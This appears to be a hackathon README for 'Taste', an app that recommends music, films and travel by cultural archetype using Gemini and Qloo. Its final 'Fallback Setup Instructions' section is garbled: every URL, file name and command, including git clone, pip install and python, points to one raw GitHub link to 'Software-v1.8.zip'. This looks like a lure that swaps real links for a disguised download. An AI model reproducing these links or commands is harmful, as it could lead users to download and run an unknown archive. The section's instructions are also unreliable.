# 🎨 Taste App – Hackathon Technical Report
**Discover Who You Are Through What You Love**

---

## 📌 Project Title
**Taste – A Cultural Archetype Discovery App**

---

## ❓ Problem Statement
Current recommendation systems are overly transactional.  
They suggest what to consume next, but not why you love it — missing the emotional and cultural context.  
**How might we make recommendations feel personal, emotional, and community-driven — based on who we are, not just what we click?**

---

## 💡 Solution Overview
Taste is a personalized cultural discovery platform that maps user preferences across:

- 🎵 Music  
- 🎬 Movies  
- 📚 Books  
- ✈️ Travel  
- 🎮 Video Games  
- 🎙️ Podcasts  
- 📺 TV Shows  

It assigns users a **Cultural Archetype** — a lens through which all future discovery flows.

**Core Features Include:**

- Mood-driven daily suggestions  
- Archetype-based community polls  
- Taste Twin connections  
- Group blending experiences  
- Culture-expanding day plans  

---

## 🧠 Core Tech Stack

| Layer            | Tools/Technologies Used             |
|------------------|-------------------------------------|
| Frontend         | React Native                        |
| Backend          | Flask (Python) – hosted on Render   |
| Database         | Firebase Firestore (NoSQL)          |
| Realtime Updates | Firebase onSnapshot (chat, voting)  |
| AI / LLM         | Gemini API (Google)                 |
| Cultural Graph   | Qloo API                            |
| Storage/Cache    | AsyncStorage, SessionManager        |

---

## ⚙️ Functional Highlights

### 🧠 Archetype Dashboard
The Archetype Dashboard is the personalized starting point of the user’s experience. It’s designed to reflect the user’s personality, preferences, and mood in a visually engaging and interactive way.

---

## 🧬 How It Works

### 1. Archetype Generation
- When a new user completes the onboarding quiz, we send their preferences to the Gemini API.
- Based on this input, Gemini returns one of 24 predefined archetypes that best matches the user's traits and cultural inclinations.

### 2. Mood-Based Teaser Tiles
- The dashboard includes teaser tiles that change based on the user's current mood or activity (e.g., relaxed, inspired, social).
- These tiles give users quick entry points into content that fits their vibe.

### 3. Reflection Modules
- These allow users to introspect, share how they feel, or explore content tied to personal growth or emotional states.
- Reflections help deepen the emotional engagement and continuously refine the user profile.

### 4. Engagement Badge System
- Users earn badges as they interact with content, reflect consistently, or engage with the community.
- This encourages exploration and rewards ongoing participation.

---

## 🔍 Explore Page

### 🔁 Flow Overview

1. **Preference Submission**  
   Saved preferences sent to `/save-preferences`.

2. **Gemini API Integration**  
   Generates example items per preference.

3. **Entity Mapping with Qloo**  
   Example → Qloo Entity ID.

4. **Fetch Recommendations**  
   Four similar items per entity returned by Qloo.

5. **Category-Based Display**  
   Shown per category (e.g., music, movies).

6. **Item Detail View**  
   `/get-item-details` → Metadata (summary, cast, genre, platform, release year).

## 🌀 Explore Page Processing Delay
   - The Explore page may take some time to display recommendations because, for each user preference, the system generates example items using Gemini, fetches entity IDs, retrieves related recommendations, and then creates a personalized title and description. This multi-step process ensures high-quality and contextually relevant results, but can introduce delays when multiple preferences are processed.
---

## 📅 Daily Recommendation Page

### 🔁 Flow Overview

1. **Mood Selection**  
   User selects emotional state.

2. **Endpoint Triggered**  
   Calls `/daily-recommendations` with mood + preferences.

3. **Gemini API Call**  
   Generates mood-aligned activity suggestions.

4. **Qloo Mapping**  
   Gemini + user preferences → Qloo Entity IDs.

5. **Combined Logic**  
   Merged Entity IDs → Qloo for final results.

6. **Final Output**  
   Movies, travel, music or podcast suggestions matching mood and preferences.

---

## 🤝 Blend Page

### 🔁 Flow Overview

1. **Group Setup**  
   User + friends submit preferences.

2. **API Request**  
   `/blend-recommendation` receives category and all profiles.

3. **Gemini API Integration**  
   Returns example items per user.

4. **Entity Mapping**  
   All examples mapped to Qloo IDs.

5. **Combining Profiles**  
   Merged entity list → Qloo for group-optimized suggestions.

6. **Final Output**  
   Group-aligned suggestions for shared experiences.

---

## 🌐 Community Page

### 🧠 How It Works

1. **Default View**  
   Movie recommendations based on archetype.

2. **Category Selection**  
   Music, travel, books, or podcasts via dropdown.

3. **Backend Process**  
   `/community-recommendations` receives archetype + category.

4. **Gemini Integration**  
   Returns example aligned with archetype.

5. **Qloo Recommendations**  
   Gemini item → Qloo Entity → Similar suggestions.

6. **Final Output**  
   Archetype-based community taste suggestions.

---

## 👯 Taste Twins

### 🔍 How It Works

1. **Top 5 Closest Matches**  
   Alignment score based on archetype + preferences.

2. **Taste-Based Discovery**  
   Shared books, movies, or music shown to encourage connection.

---

## 🔍 Discover Page

### 👣 Walk in Their Shoes

1. **Trigger**  
   `/mismatch-walkin-their-shoes-Gemini` called with user’s archetype.

2. **Content Generation**  
   Different community → Music (morning), Podcast (afternoon), Movie (night).

3. **Interactive Cards**  
   Tapping card calls `/discover-journey-card-recommendations`.

---

### 🔄 Swap Deck

1. **Contrast-Based Generation**  
   `/swap-deck-recommendations` called with archetype.

2. **Gemini Examples**  
   Contrasting items (movies, music, books, etc.)

3. **User Interaction**  
   ❤️ Save to collection or ⏩ skip to next.

---

## 🔗 Backend API Endpoints

| Endpoint                                  | Description                                                                 |
|-------------------------------------------|-----------------------------------------------------------------------------|
| `/save-preferences`                      | Explore page recommendation based on every preference of user              |
| `/get-item-details`                      | Return metadata for a recommendation item                                  |
| `/daily-recommendations`                 | Provide daily recommendation based on how user is feeling today            |
| `/community-recommendations`            | Recommendations based on the user's archetype                              |
| `/blend-recommendation`                 | Recommendations based on user + friends' preferences                       |
| `/mismatch-walkin-their-shoes-Gemini`   | Opposite community preferences for morning, afternoon, night               |
| `/swap-deck-recommendations`            | Opposite taste profile content suggestions                                 |

---

## 🔌 External APIs Used

### Gemini API
- Archetype generation  
- Mood-based content  
- Day plans and swap content  

### Qloo API
- Taste graph-based similarity  
- Cultural archetype mapping  
- Archetype-specific recommendations  

---

## 🗃️ Firebase Architecture

- **Collections**: `users`, `user_collections`, `friends`, `chat_rooms`, `user_activities`  
- **Realtime**: `onSnapshot` for chat and polling  
- **Security**: Scoped access via `userId` and indexed filters  
- **Features**: Bidirectional friend mapping  

---

## 🚧 Challenges Faced

| Issue                       | Details                                                  |
|-----------------------------|----------------------------------------------------------|
| Render Free Tier Limitations | Cold starts (15+ sec delay after idle)                   |
| Limited Compute             | Only ~0.1 vCPU and 512MB RAM                             |
| Firebase Offline Disabled   | Leads to access issues in poor network scenarios         |

---

## 🌟 Why It Stands Out

- Combines real-time LLMs + Qloo recommendation 
- Prioritizes emotional personalization  
- Enables cross-archetype exploration  
- Integrates group dynamics (friends, polls, twin matching)  

---

## 🔭 Future Scope

- Upgrade to paid Render, or migrate to Railway / Cloud Run  
- Enable Firebase offline sync  
- Allow custom archetype creation  
- Expand to cover fashion, design, and personal values 

---

## ✅ Submission Highlights

| Module                 | Status                    |
|------------------------|---------------------------|
| React Native App       | Fully functional prototype |
| Flask Backend          | Hosted and operational     |
| Firebase Chat & Storage| Real-time features working |
| Gemini & Qloo APIs     | Integrated successfully    |

---

## 📝 TL;DR

**Taste is a next-generation cultural OS that transforms personal preferences into shared discovery, emotional connection, and community.**

---

## 📝 Fallback Setup Instructions for Flask Server

Your application uses a Flask backend hosted at:  
`https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip`

This backend is hosted on Render, which offers **512 MB** of storage on the free tier.  
In rare cases, if the application’s memory or storage usage exceeds this limit, the hosted backend may temporarily stop responding.  
To ensure continued functionality, you can run the Flask server locally by following the steps below:

---

### ✅ 1. Clone the Flask Server Repository

```bash
git clone https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip
cd taste-backend
```

Make sure the following files are present:

- `https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip`  
- `https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip`  
- `https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip`  
- `https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip`

---

### ✅ 2. Install Dependencies

Create and activate a virtual environment (optional but recommended):

```bash
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate
```

Then install dependencies:

```bash
pip install -r https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip
```

---

### ✅ 3. Run the Flask Server

```bash
python https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip
```

Once running, you’ll see:

```
Running on http://127.0.0.1:5000
```

---

### ✅ 4. Replace API URL in Your App

Replace:

```cpp
https://raw.githubusercontent.com/deenasar/Taste/main/android/app/src/Software-v1.8.zip
```

With:

```cpp
http://<your-ip-address>:5000
```

To find your local IP address:

- **Windows**: Run `ipconfig` in Command Prompt  
- **Mac/Linux**: Run `ifconfig` or `hostname -I`  

Example:

```cpp
http://192.168.0.101:5000
```

---

### ✅ 5. Mobile Connectivity (If testing on a mobile device)

- Ensure PC and mobile are on the **same Wi-Fi**  
- If using USB cable, enable **network sharing** (optional)  
- Test connection by opening `http://<your-ip>:5000` on mobile browser  
- Your app will now connect to the local Flask server

---
